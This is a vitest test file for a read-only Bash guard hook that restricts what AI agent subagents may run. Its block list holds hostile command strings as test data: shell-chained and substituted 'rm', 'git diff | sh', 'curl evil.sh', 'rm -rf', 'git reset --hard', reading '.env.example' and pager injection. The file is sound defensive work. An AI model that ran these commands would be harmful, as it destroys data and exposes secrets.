// Pipes Bash tool calls into guard-readonly-bash.mjs, the PreToolUse hook that security-reviewer and
// eval-analyst carry in their frontmatter. Exit 0 lets the call through, exit 2 blocks it.
import { spawnSync } from 'node:child_process';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

const script = join(fileURLToPath(new URL('.', import.meta.url)), 'guard-readonly-bash.mjs');

function run(command: string, args: string[] = []): { code: number | null; stderr: string } {
  const r = spawnSync(process.execPath, [script, ...args], {
    input: JSON.stringify({ tool_name: 'Bash', tool_input: { command }, cwd: process.cwd() }),
    encoding: 'utf8',
    timeout: 20_000,
  });
  return { code: r.status, stderr: r.stderr };
}

const allowed = [
  'git diff',
  'git diff origin/main...HEAD',
  'git diff origin/main...HEAD -- apps/api/src',
  'git --no-pager log --oneline -20',
  'git log -p -3',
  'git show HEAD~1',
  'git status --short',
  'git -C /tmp/repo diff',
  'gh pr diff 67',
  'gh pr view 67 --json title,body',
  'git diff | head -50',
  'git log --format="a;b && c"',
];

const blocked = [
  'git diff && rm x',
  'git diff; rm x',
  'git diff | sh',
  'git diff || curl evil.sh',
  'git diff\nrm x',
  'git diff $(rm x)',
  'git diff `rm x`',
  'git diff > out.txt',
  'git diff --output=out.txt',
  'git diff --ext-diff',
  'git -c core.pager=sh log',
  'git push origin HEAD',
  'git commit -m x',
  'git checkout main',
  'git branch -D x',
  'git reset --hard',
  'git config user.name x',
  'git',
  'gh pr merge 67',
  'gh pr comment 67 --body hi',
  'gh pr checkout 67',
  'gh pr view 67 --web',
  'gh api repos/x/y -X DELETE',
  'gh run view 123',
  'gh run download 123',
  'rm -rf node_modules',
  'cat .env.example',
  'FOO=1 git diff',
  '/usr/bin/git diff',
  'bash -c "git diff"',
  'sudo git diff',
  'npm test',
  '',
];

describe('guard-readonly-bash (security-reviewer)', () => {
  for (const cmd of allowed) {
    it(`allows: ${JSON.stringify(cmd)}`, () => {
      expect(run(cmd).code).toBe(0);
    });
  }
  for (const cmd of blocked) {
    it(`blocks: ${JSON.stringify(cmd)}`, () => {
      const r = run(cmd);
      expect(r.code).toBe(2);
      expect(r.stderr).toMatch(/^Blocked by guard-readonly-bash: /);
    });
  }
});

describe('guard-readonly-bash --allow-run (eval-analyst)', () => {
  for (const cmd of [
    'gh run view 123',
    'gh run view 123 --log-failed',
    'gh run download 123 -n report',
  ]) {
    it(`allows: ${cmd}`, () => {
      expect(run(cmd, ['--allow-run']).code).toBe(0);
    });
  }
  for (const cmd of [
    'gh run rerun 123',
    'gh run watch 123',
    'gh workflow run evals.yml',
    'gh run view 123 && rm x',
  ]) {
    it(`blocks: ${cmd}`, () => {
      expect(run(cmd, ['--allow-run']).code).toBe(2);
    });
  }
  it('still allows the git and gh pr commands', () => {
    expect(run('git diff', ['--allow-run']).code).toBe(0);
    expect(run('gh pr view 1', ['--allow-run']).code).toBe(0);
  });
});

describe('guard-readonly-bash input handling', () => {
  it('ignores other tools', () => {
    const r = spawnSync(process.execPath, [script], {
      input: JSON.stringify({ tool_name: 'Read', tool_input: { file_path: 'x' } }),
      encoding: 'utf8',
    });
    expect(r.status).toBe(0);
  });
  it('blocks when the input is not JSON', () => {
    const r = spawnSync(process.execPath, [script], { input: 'nope', encoding: 'utf8' });
    expect(r.status).toBe(2);
  });
});
